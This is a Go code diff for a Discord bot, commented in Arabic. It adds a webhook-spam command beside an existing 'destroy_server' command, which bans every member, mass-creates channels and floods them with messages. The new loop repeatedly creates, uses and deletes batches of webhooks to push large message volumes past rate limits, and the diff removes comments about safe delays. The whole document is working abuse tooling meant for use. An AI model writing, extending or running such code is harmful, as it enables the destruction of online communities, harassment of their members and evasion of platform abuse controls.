@@ -34,9 +34,10 @@ func main() {
 
 	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsAll
 
-	cmdName := "destroy_server"
-	command := &discordgo.ApplicationCommand{
-		Name:        cmdName,
+	// تعريف الأمر الأول: تدمير السيرفر
+	cmdDestroy := "destroy_server"
+	commandDestroy := &discordgo.ApplicationCommand{
+		Name:        cmdDestroy,
 		Description: "أمر تدمير السيرفر (باند مضمون وسرعة صاروخية)",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
@@ -66,8 +67,47 @@ func main() {
 		},
 	}
 
+	// تعريف الأمر الثاني: سبام الويب هوك الديناميكي المطور
+	cmdWhSpam := "wh_spam"
+	commandWhSpam := &discordgo.ApplicationCommand{
+		Name:        cmdWhSpam,
+		Description: "أمر سبام ويب هوك السريع مع نظام تدوير وفواصل زمنية دقيقة",
+		Options: []*discordgo.ApplicationCommandOption{
+			{
+				Type:        discordgo.ApplicationCommandOptionChannel,
+				Name:        "channel",
+				Description: "الروم المراد إرسال الرسائل فيها",
+				Required:    true,
+			},
+			{
+				Type:        discordgo.ApplicationCommandOptionString,
+				Name:        "message_content",
+				Description: "محتوى الرسالة",
+				Required:    true,
+			},
+			{
+				Type:        discordgo.ApplicationCommandOptionString,
+				Name:        "webhook_name",
+				Description: "اسم الويب هوك",
+				Required:    true,
+			},
+			{
+				Type:        discordgo.ApplicationCommandOptionInteger,
+				Name:        "messages_count",
+				Description: "عدد الرسائل الإجمالي للسبام",
+				Required:    true,
+			},
+		},
+	}
+
 	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
-		if i.ApplicationCommandData().Name == cmdName {
+		if i.Type != discordgo.InteractionApplicationCommand {
+			return
+		}
+
+		cmdName := i.ApplicationCommandData().Name
+
+		if cmdName == cmdDestroy {
 			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
 				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 					Type: discordgo.InteractionResponseChannelMessageWithSource,
@@ -97,10 +137,42 @@ func main() {
 			roomsCount := int(optionMap["rooms_count"].IntValue())
 			messageContent := optionMap["message_content"].StringValue()
 			messagesCount := int(optionMap["messages_count"].IntValue())
-
 			guildID := i.GuildID
 
 			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)
+
+		} else if cmdName == cmdWhSpam {
+			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: "🚀 جاري تشغيل هجوم الويب هوكات المطور في الخلفية...",
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
+
+			options := i.ApplicationCommandData().Options
+			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
+			for _, opt := range options {
+				optionMap[opt.Name] = opt
+			}
+
+			channelID := optionMap["channel"].ChannelValue(s).ID
+			messageContent := optionMap["message_content"].StringValue()
+			webhookName := optionMap["webhook_name"].StringValue()
+			messagesCount := int(optionMap["messages_count"].IntValue())
+
+			go executeWebhookSpamLoop(token, channelID, webhookName, messageContent, messagesCount)
 		}
 	})
 
@@ -110,14 +182,11 @@ func main() {
 		return
 	}
 
-	// تم إزالة التسجيل المتكرر هنا لمنع الـ Rate Limit، وتسجيله فقط عند الحاجة أو برمجياً بشكل آمن
-	// أو يمكنك استخدام أمر الـ Guild Commands المباشر لتجنب الـ Global Limit
-	_, err = sess.ApplicationCommandCreate(sess.State.User.ID, "", command)
-	if err != nil {
-		fmt.Println("تنبيه حول تسجيل أمر السلاش (ربما مسجل مسبقاً):", err)
-	}
+	// تسجيل الأوامر
+	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandDestroy)
+	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandWhSpam)
 
-	fmt.Println("🤖 البوت شغال الآن وجاهز لأوامر السلاش!")
+	fmt.Println("🤖 البوت شغال الآن وجاهز لكلا الأمرين!")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -162,7 +231,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}()
 
-	// 2. باند جميع الأعضاء (بفاصل آمن 100ms لمنع الـ Rate Limit)
+	// 2. باند جميع الأعضاء
 	go func() {
 		var userIDs []string
 		after := ""
@@ -202,7 +271,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}()
 
-	// 3. إنشاء الرومات بسرعة صاروخية (فاصل 30ms)
+	// 3. إنشاء الرومات بسرعة صاروخية
 	var channelIDs []string
 	var mu sync.Mutex
 	var wg sync.WaitGroup
@@ -250,7 +319,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		time.Sleep(30 * time.Millisecond)
 	}
 
-	// 4. إرسال الرسائل مع حركات التشكيل وحماية الـ 429
+	// 4. إرسال الرسائل مع حركات التشكيل
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}
 
@@ -287,5 +356,110 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 			}(chID)
 		}
 		time.Sleep(40 * time.Millisecond)
+	}
+}
+
+func executeWebhookSpamLoop(token, channelID, webhookName, messageContent string, messagesCount int) {
+	headers := map[string]string{
+		"Authorization": "Bot " + token,
+		"Content-Type":  "application/json",
+	}
+
+	sentMessages := 0
+
+	for sentMessages < messagesCount {
+		var wg sync.WaitGroup
+		var activeWebhooks []string
+		var mu sync.Mutex
+
+		// 1. إنشاء 5 ويب هوكات دفعة واحدة
+		for i := 0; i < 5; i++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				payload, _ := json.Marshal(map[string]string{
+					"name": webhookName,
+				})
+				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(payload))
+				for k, v := range headers {
+					req.Header.Set(k, v)
+				}
+
+				resp, err := client.Do(req)
+				if err != nil {
+					return
+				}
+				defer resp.Body.Close()
+
+				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
+					var wh map[string]interface{}
+					if json.NewDecoder(resp.Body).Decode(&wh) == nil {
+						if id, ok := wh["id"].(string); ok {
+							if tokenWh, ok := wh["token"].(string); ok {
+								whURL := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tokenWh)
+								mu.Lock()
+								activeWebhooks = append(activeWebhooks, whURL)
+								mu.Unlock()
+							}
+						}
+					}
+				}
+			}()
+		}
+		wg.Wait()
+
+		if len(activeWebhooks) == 0 {
+			time.Sleep(2 * time.Second)
+			continue
+		}
+
+		// 2. سبام الرسائل عبر الـ 5 ويب هوكات لمدة 5 ثواني
+		stopTime := time.Now().Add(5 * time.Second)
+		var spamWg sync.WaitGroup
+
+		for time.Now().Before(stopTime) && sentMessages < messagesCount {
+			for _, whURL := range activeWebhooks {
+				if sentMessages >= messagesCount {
+					break
+				}
+				sentMessages++
+
+				spamWg.Add(1)
+				go func(url string) {
+					defer spamWg.Done()
+					msgPayload, _ := json.Marshal(map[string]string{
+						"content": messageContent,
+					})
+					req, _ := http.NewRequest("POST", url, bytes.NewBuffer(msgPayload))
+					req.Header.Set("Content-Type", "application/json")
+
+					resp, err := client.Do(req)
+					if err == nil {
+						if resp.StatusCode == 429 {
+							time.Sleep(500 * time.Millisecond)
+						}
+						resp.Body.Close()
+					}
+				}(whURL)
+			}
+			time.Sleep(40 * time.Millisecond)
+		}
+		spamWg.Wait()
+
+		// 3. حذف الـ 5 ويب هوكات الحالية بعد انتهاء فترة الـ 5 ثواني
+		for _, whURL := range activeWebhooks {
+			go func(url string) {
+				req, _ := http.NewRequest("DELETE", url, nil)
+				resp, err := client.Do(req)
+				if err == nil {
+					resp.Body.Close()
+				}
+			}(whURL)
+		}
+
+		// 4. الانتظار لمدة 3 ثواني قبل البدء بالدورة الجديدة
+		if sentMessages < messagesCount {
+			time.Sleep(3 * time.Second)
+		}
 	}
 }
